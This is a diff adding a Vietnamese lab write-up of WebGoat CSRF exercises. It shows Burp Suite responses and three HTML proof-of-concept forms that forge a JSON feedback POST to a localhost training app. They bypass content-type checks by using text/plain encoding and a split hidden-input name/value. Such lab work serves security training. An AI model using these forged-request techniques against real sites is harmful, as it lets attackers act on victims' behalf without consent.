@@ -1,0 +1,63 @@
+Cross-Site Request Forgeries
+3: Basic Get CSRF Exercise
+Khởi chạy Burpsuite.
+Response trả về khi click "Submit Query":
+{
+  "flag" : null,
+  "success" : false,
+  "message" : "Appears the request came from the original host"
+}
+Cần thực hiện submit query host khác.
+Sử dụng security.love, thay đổi thông tin như request trong Burpsuite
+Tải file html vê từ security.love và upload lên WebWolf.
+Thực thi file và nhận được respone bao gồm giá trị của flag
+Submit flag.
+
+4: Post a review on someone else’s behalf
+Thực hiện tương tự lab 3
+
+7: CSRF and content-type
+Thực hiện "Send Message" với thông tin yêu cầu
+{
+  "name"    : "WebGoat",
+  "email"   : "webgoat@webgoat.org",
+  "content" : "WebGoat is the best!!"
+}
+Response tương ứng:
+{
+  "lessonCompleted" : false,
+  "feedback" : "Sorry the solution is not correct, please try again.",
+  "output" : null,
+  "assignment" : "CSRFFeedback",
+  "attemptWasMade" : true
+}
+Sử dụng security.love tạo file html tương ứng với request và chỉnh sửa một số thông tin như sau:
+* enctype="application/json"
+* Chỉnh sửa input type="hidden"
+* Chỉnh sửa trường name tương ứng với kiểu dữ liệu json
+
+<html>
+<form enctype="application/json" method="POST" action="http://127.0.0.1:8080/WebGoat/csrf/feedback/message"><table><tr><td>"name":"WebGoat","email":"webgoat@webgoat.org","subject":"service","message":"WebGoat is the best!!"</td><td><input type="hidden" name='{"name":"WebGoat","email":"webgoat@webgoat.org","subject":"service","message":"WebGoat is the best!!"}'></td></tr>
+</table><input type="submit" value="http://127.0.0.1:8080/WebGoat/csrf/feedback/message">
+</form>
+</html>
+
+Upload file html lên WebGoat và nhấn submit.
+Response nhận được sau khi nhấn submit là một "Whitelabel Error Page" với mã lỗi 37: "Unexpected character (%)". Dữ liệu hợp lệ, không được phép có ký tự "%".
+Do ký tự (%) xuất hiện do được encode trước khi gửi đi, thay đổi enctype="text/plain" và thử lại.
+
+<html>
+<form enctype="text/plain" method="POST" action="http://127.0.0.1:8080/WebGoat/csrf/feedback/message"><table><tr><td>"name":"WebGoat","email":"webgoat@webgoat.org","subject":"service","message":"WebGoat is the best!!"</td><td><input type="hidden" name='{"name":"WebGoat","email":"webgoat@webgoat.org","subject":"service","message":"WebGoat is the best!!"}'></td></tr>
+</table><input type="submit" value="http://127.0.0.1:8080/WebGoat/csrf/feedback/message">
+</form>
+</html>
+
+"Whitelable Error Page" vẫn xuất hiện với mã lỗi mới Unexpected character ('='(code 61)). Trên lỗi gửi về cho thấy một "=" xuất hiện ở cuối dữ liệu khiến cho dữ liệu không hợp lệ. Khi gửi dữ liệu với value để trống, trình duyệt sẽ tự động thêm "=" vào cuối. Theo pentestmonkey, tạo và gán giá trị cho value, sau đó đưa giá trị này vào 1 trường thông tin không cần thiết.
+
+<html>
+<form enctype="text/plain" method="POST" action="http://127.0.0.1:8080/WebGoat/csrf/feedback/message"><table><tr><td>"name":"WebGoat","email":"webgoat@webgoat.org","subject":"service","message":"WebGoat is the best!!"</td><td><input type="hidden" name='{"name":"WebGoat","email":"webgoat@webgoat.org","subject":"service","message":"WebGoat is the best!!"' value='"}'></td></tr>
+</table><input type="submit" value="http://127.0.0.1:8080/WebGoat/csrf/feedback/message">
+</form>
+</html>
+
+Server-side Request Forgeries
